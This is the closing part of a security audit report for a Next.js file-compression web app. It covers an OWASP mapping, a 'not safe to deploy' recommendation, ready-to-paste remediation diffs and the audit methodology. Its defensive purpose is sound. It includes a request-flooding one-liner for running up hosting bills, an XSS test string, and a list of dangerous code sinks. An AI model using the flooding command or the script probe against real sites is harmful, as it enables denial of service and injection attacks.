| **B9** | Add magic-byte file-type sniffing (M-5) | Recommended | 45 min |
| **B10** | Add `Secure` flag to cookies (L-1) | Recommended | 10 min |

**Total time to address all blockers + recommended:** ~5 hours of focused work.

After addressing B1–B3 (the hard blockers), the application is **safe for soft launch** to a controlled audience (e.g., 50 personal contacts). Public launch + paid traffic should wait until B4–B10 are also addressed.

---

## 5. OWASP Top 10 Mapping

| OWASP 2021 Category | Findings | Notes |
|---|---|---|
| **A01: Broken Access Control** | None | No auth, no user resources, no role boundaries. N/A. |
| **A02: Cryptographic Failures** | None | No secrets stored, no PII transmitted, no crypto-handled data. Cookies are non-sensitive. |
| **A03: Injection** | M-1 (marked → dangerouslySetInnerHTML) | XSS path exists but inert until UGC is introduced. |
| **A04: Insecure Design** | M-5 (file-type validation), L-2 (debug route exposed) | Defense-in-depth gaps. |
| **A05: Security Misconfiguration** | **H-1 (missing headers)**, L-1 (cookie Secure), L-2 (design-system), M-2 (dynamic params), M-3 (page count), M-4 (blob leak) | Primary risk category. |
| **A06: Vulnerable and Outdated Components** | **H-2 (Next.js CVEs)**, H-3 (next-pwa transitive), L-4 (postcss), L-5 (next-intl, not exploitable) | All addressable via upgrades. |
| **A07: Identification & Authentication Failures** | None | No auth flow. N/A. |
| **A08: Software and Data Integrity Failures** | None | No deserialization of untrusted data, no auto-updates pulled from third parties at runtime. |
| **A09: Security Logging and Monitoring Failures** | Soft gap | Sentry not yet integrated (planned per `LAUNCH_CHECKLIST.md`). Not strictly a vulnerability. |
| **A10: Server-Side Request Forgery (SSRF)** | None | No server-side network egress. N/A. |

**Net OWASP exposure:** Primarily A05 (Security Misconfiguration) and A06 (Vulnerable Components). Both are remediable in hours, not days.

---

## 6. Final Recommendation

> ### **NOT SAFE TO DEPLOY** to public production in the current state.
>
> The architecture is sound and the application has no critical (immediately exploitable) vulnerabilities. However, three issues are deployment-blocking and must be resolved before pointing DNS to production:
>
> 1. **Missing security headers (H-1)** — without CSP, HSTS, and frame-ancestors, the application is materially below industry-standard hardening. Any post-launch security scanner (Mozilla Observatory, SecurityHeaders.com) will grade it **D or F**, which is a credibility problem for a "privacy-first" brand.
> 2. **Unbounded dynamic-route fanout (M-2)** — a single attacker can run up Vercel bills with `seq 1 100000 | xargs curl`. Five-minute fix.
> 3. **No PDF page-count cap (M-3)** — a deterministic browser-crash vector. Self-inflicted DoS that erodes trust on the first user who tries a 500-page scan.
>
> **After addressing those three (≤ 1 hour of work), the application is SAFE FOR SOFT LAUNCH.**
>
> For **PUBLIC LAUNCH with paid traffic** (e.g., AdSense, paid acquisition), additionally complete:
> - Upgrade Next.js 14 → 15 (H-2)
> - Pin/fix next-pwa transitive (H-3)
> - Sanitize marked output (M-1)
> - Fix blob-URL leak (M-4)
> - Add magic-byte file sniffing (M-5)
> - Hide `/design-system` (L-2)
> - Add `Secure` cookie flag (L-1)
>
> Total: **≤ 5 hours of work** to move from "not safe" to "production-grade hardened."
>
> Once those are done, an independent re-test should confirm:
> - `securityheaders.com` score: **A or A+**
> - `npm audit --omit=dev` returns clean or near-clean
> - `curl -I` shows all five security headers
> - `/random-slug-1234` returns CDN-cached 404 (no SSR)
> - A 1000-page test PDF returns a clear "too many pages" error within seconds, not a tab freeze
> - Blog post containing `<script>alert(1)</script>` renders as escaped text

---

## Appendix A — Specific code-level changes (copy/paste ready)

### A.1 — `next.config.mjs` final form

See H-1 fix block. Add the `headers()` async function. Re-run `npm run build` and confirm exit 0.

### A.2 — Dynamic route locking

```diff
# src/app/[slug]/page.tsx
+ export const dynamicParams = false
  export async function generateStaticParams() {
    return allLandingSlugs().map((slug) => ({ slug }))
  }

# src/app/blog/[slug]/page.tsx
+ export const dynamicParams = false
  export async function generateStaticParams() {
    const slugs = await getAllSlugs()
    return slugs.map((slug) => ({ slug }))
  }
```

### A.3 — Page-count cap

```diff
# src/lib/compression/pdf.ts
+ const MAX_PAGES = 200
+
  // ...inside compressPdf:
  const doc = await pdfjs.getDocument({ data: buffer }).promise
  const pageCount = doc.numPages
+ if (pageCount > MAX_PAGES) {
+   await doc.destroy()
+   throw new Error(`PDF has ${pageCount} pages — limit is ${MAX_PAGES}. Split the PDF first.`)
+ }
```

Mirror the same change in `src/lib/compression/pdf-to-image.ts` around line 101.

### A.4 — Design-system production hide

```diff
# src/app/design-system/page.tsx
+ import { notFound } from 'next/navigation'
+
  export default function DesignSystemPage() {
+   if (process.env.NODE_ENV === 'production') notFound()
    // existing render...
  }
```

### A.5 — Blob-URL leak fix

```diff
# src/components/tools/compress-image-tool.tsx (around line 290–310)
+ const originalUrl = React.useMemo(
+   () => (state.file ? URL.createObjectURL(state.file) : null),
+   [state.file],
+ )
+ React.useEffect(() => {
+   return () => { if (originalUrl) URL.revokeObjectURL(originalUrl) }
+ }, [originalUrl])

  // in JSX:
- <img src={URL.createObjectURL(state.file)} alt="Original" />
+ {originalUrl && <img src={originalUrl} alt="Original" />}
```

### A.6 — Cookie Secure flag

```diff
# src/components/brand/lang-toggle.tsx
- document.cookie = `NEXT_LOCALE=${next}; path=/; max-age=${60 * 60 * 24 * 365}; samesite=lax`
+ const secure = typeof location !== 'undefined' && location.protocol === 'https:' ? '; secure' : ''
+ document.cookie = `NEXT_LOCALE=${next}; path=/; max-age=${60 * 60 * 24 * 365}; samesite=lax${secure}`

# src/components/layout/cookie-banner.tsx
- document.cookie = `${COOKIE_NAME}=${COOKIE_VALUE_ACK}; path=/; max-age=${COOKIE_MAX_AGE}; samesite=lax`
+ const secure = location.protocol === 'https:' ? '; secure' : ''
+ document.cookie = `${COOKIE_NAME}=${COOKIE_VALUE_ACK}; path=/; max-age=${COOKIE_MAX_AGE}; samesite=lax${secure}`
```

### A.7 — Blog sanitization

See M-1 fix block.

---

## Appendix B — Audit methodology

This audit performed:

1. **Static enumeration** via grep/find across `src/` for known dangerous sinks: `eval`, `Function`, `innerHTML`, `outerHTML`, `document.write`, `dangerouslySetInnerHTML`, `fetch`, `XMLHttpRequest`, `process.env`, `localStorage`, `sessionStorage`, `document.cookie`, `URL.createObjectURL`, `new Worker`.
2. **API surface enumeration** — searched for `route.ts`, `'use server'`, middleware files. Confirmed zero exist.
3. **Dependency audit** via `npm audit --omit=dev --json` plus manual review of versions of high-risk libs (`pdfjs-dist`, `pdf-lib`, `libheif-js`, `jszip`, `marked`, `gray-matter`, `next`, `next-intl`).
4. **File-handling deep dive** — read full source of `src/lib/compression/*.ts`, `src/components/tools/file-drop-zone.tsx`, and per-tool components. Looked for size caps, count caps, MIME validation, abort signals, blob-URL lifecycle.
5. **Dynamic-route analysis** — read `[slug]` and `blog/[slug]` routes, verified `generateStaticParams` correctness, looked for `dynamicParams` declaration.
6. **PWA + service-worker review** — read `public/sw.js` precache manifest, verified scope, verified WASM-worker exclusion.
7. **Build configuration review** — read full `next.config.mjs`, `package.json`, `manifest.webmanifest`.
8. **Production-build check** — `npm run build` confirmed exit 0 with all 40 routes generated.

Approximate tool-call count: ~25 file reads + grep/find invocations.
